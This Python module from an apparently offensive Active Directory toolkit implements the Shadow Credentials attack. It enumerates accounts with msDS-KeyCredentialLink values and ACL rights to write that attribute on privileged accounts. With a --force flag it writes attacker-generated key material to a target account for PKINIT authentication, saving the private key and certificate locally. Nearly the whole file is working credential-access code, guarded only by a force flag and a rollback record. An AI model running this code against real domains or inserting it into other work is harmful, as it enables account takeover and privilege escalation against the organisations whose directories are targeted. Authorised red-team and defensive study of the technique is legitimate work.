"""Shadow Credentials — enumerate and (optionally) write msDS-KeyCredentialLink.

Enum is safe. Write path requires --force and produces a device-key material
blob suitable for PKINIT auth. Successful writes are recorded through the
central rollback registry so `adaf-attack run rollback --force` can reverse them.
"""

from __future__ import annotations

import json
from typing import Any

from ldap3 import SUBTREE
from rich.console import Console

from adaf_attack.core.acl import fetch_sd, parse_interesting_aces
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.registry import register_capability
from adaf_attack.core.rollback import record_pre_state
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()

ATTR = "msDS-KeyCredentialLink"


def _list_attr(entry: Any, name: str) -> list[Any]:
    val = getattr(entry, name, None)
    if not val:
        return []
    raw = val.value if hasattr(val, "value") else val
    if raw is None:
        return []
    if isinstance(raw, list | tuple):
        return list(raw)
    return [raw]


@register_capability(
    id="shadow-creds",
    summary="Enumerate msDS-KeyCredentialLink; optional write requires --force",
    category="credential-access",
    tags=("shadow-credentials", "keycredentiallink", "pkinit", "adcs", "rollback"),
    destructive=True,  # write path is destructive; enum still runs without force
)
class ShadowCreds:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        write_target = kwargs.get("write_target") or kwargs.get("sam")
        console.print(f"[bold]Shadow Credentials[/bold] → {target.domain} @ {target.dc_ip}")

        conn, base_dn, _cfg = ldap_connect(target)

        result: dict[str, Any] = {
            "domain": target.domain,
            "accounts_with_keycred": [],
            "writable_principals": [],
            "write_attempt": None,
        }

        # Enumerate accounts that already have KeyCredentialLink values
        conn.search(
            base_dn,
            f"(&(|(objectClass=user)(objectClass=computer))({ATTR}=*))",
            search_scope=SUBTREE,
            attributes=["sAMAccountName", "distinguishedName", "objectClass", ATTR],
        )
        for entry in conn.entries:
            sam = str(entry.sAMAccountName) if entry.sAMAccountName else None
            if not sam:
                continue
            classes = [
                str(c).lower() for c in (entry.objectClass.values if entry.objectClass else [])
            ]
            kind = "Computer" if "computer" in classes else "User"
            values = _list_attr(entry, ATTR)
            item = {
                "sam": sam,
                "dn": str(entry.distinguishedName),
                "kind": kind,
                "keycred_count": len(values),
            }
            result["accounts_with_keycred"].append(item)
            node_id = f"{kind.upper()}@{sam.upper()}@{target.domain.upper()}"
            graph.add_node(node_id, kind, sam=sam, dn=item["dn"], shadow_creds=True)
            graph.add_edge(node_id, node_id, "HasKeyCredentialLink", count=len(values))
            console.print(f"  [cyan]{sam}[/cyan]  keycred={len(values)}  ({kind})")

        # Who can write KeyCredentialLink on high-value users/computers (ACL signal)
        conn.search(
            base_dn,
            "(&(|(objectClass=user)(objectClass=computer))(|(adminCount=1)(sAMAccountName=krbtgt)))",
            search_scope=SUBTREE,
            attributes=["sAMAccountName", "distinguishedName", "nTSecurityDescriptor"],
        )
        for entry in conn.entries:
            sam = str(entry.sAMAccountName) if entry.sAMAccountName else None
            dn = str(entry.distinguishedName)
            if not sam:
                continue
            sd = fetch_sd(conn, dn)
            if not sd:
                continue
            try:
                for ace in parse_interesting_aces(sd):
                    if ace.right in ("GenericAll", "GenericWrite", "WriteProperty", "WriteDacl"):
                        result["writable_principals"].append(
                            {
                                "target_sam": sam,
                                "target_dn": dn,
                                "principal_sid": ace.principal_sid,
                                "right": ace.right,
                            }
                        )
                        src = f"SID@{ace.principal_sid}"
                        tgt = f"USER@{sam.upper()}@{target.domain.upper()}"
                        graph.add_node(src, "Base", sid=ace.principal_sid)
                        graph.add_edge(src, tgt, "WriteKeyCredentialLink", right=ace.right)
            except Exception:  # noqa: BLE001
                pass

        # Optional write
        if write_target:
            if not force:
                console.print(
                    "[yellow]Write requested but --force not set — enum only. "
                    "Re-run with --force to write KeyCredentialLink.[/yellow]"
                )
                result["write_attempt"] = {"sam": write_target, "skipped": "force_required"}
            else:
                result["write_attempt"] = self._write_keycred(
                    conn, base_dn, target, write_target, session
                )

        conn.unbind()

        out_path = session.path("shadow-creds.json")
        out_path.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "shadow-creds.complete",
            keycred_accounts=len(result["accounts_with_keycred"]),
            writable=len(result["writable_principals"]),
            write=bool(result["write_attempt"] and not result["write_attempt"].get("skipped")),
        )
        console.print(
            f"[green]Done[/green]  with_keycred={len(result['accounts_with_keycred'])}  "
            f"writable_aces={len(result['writable_principals'])}"
        )
        console.print(f"Results → {out_path}")
        return result

    def _write_keycred(
        self,
        conn: Any,
        base_dn: str,
        target: Target,
        sam: str,
        session: Session,
    ) -> dict[str, Any]:
        """Generate KeyCredential blob and LDAP-add to msDS-KeyCredentialLink."""
        from ldap3 import MODIFY_ADD

        from adaf_attack.core.keycred import generate_shadow_material

        console.print(f"[red]WRITE[/red] KeyCredentialLink on [cyan]{sam}[/cyan]")
        conn.search(
            base_dn,
            f"(sAMAccountName={sam})",
            search_scope=SUBTREE,
            attributes=["distinguishedName", ATTR],
        )
        if not conn.entries:
            return {"sam": sam, "ok": False, "error": "account not found"}

        dn = str(conn.entries[0].distinguishedName)
        try:
            material = generate_shadow_material(sam, dn)
            key_path = session.path(f"shadow-{sam}.key.pem")
            cert_path = session.path(f"shadow-{sam}.cert.pem")
            key_path.write_bytes(material["private_key_pem"])
            cert_path.write_bytes(material["cert_pem"])
            dn_bin_path = session.path(f"shadow-{sam}.dnbinary.txt")
            dn_bin_path.write_text(material["dn_binary"] + "\n", encoding="utf-8")

            ok = conn.modify(dn, {ATTR: [(MODIFY_ADD, [material["dn_binary"]])]})
            result = {
                "sam": sam,
                "dn": dn,
                "ok": bool(ok),
                "ldap_written": bool(ok),
                "ldap_result": str(conn.result),
                "key_pem": str(key_path),
                "cert_pem": str(cert_path),
                "dn_binary_path": str(dn_bin_path),
                "blob_len": material["blob_len"],
            }
            if ok:
                record_pre_state(
                    session,
                    kind="shadow-creds",
                    target=dn,
                    artifact=dn_bin_path,
                    extra={
                        "rollback": "Remove the exact KeyCredentialLink DN-Binary value.",
                        "sam": sam,
                    },
                )
                console.print(f"  [green]LDAP ADD ok[/green]  {ATTR} on {dn}")
                console.print(f"  key → {key_path}")
                console.print(f"  cert → {cert_path}")
                console.print("  rollback registered — use: adaf-attack run rollback --force")
            else:
                console.print(f"  [red]LDAP modify failed[/red]: {conn.result}")
            return result
        except Exception as exc:  # noqa: BLE001
            return {"sam": sam, "ok": False, "error": str(exc)}
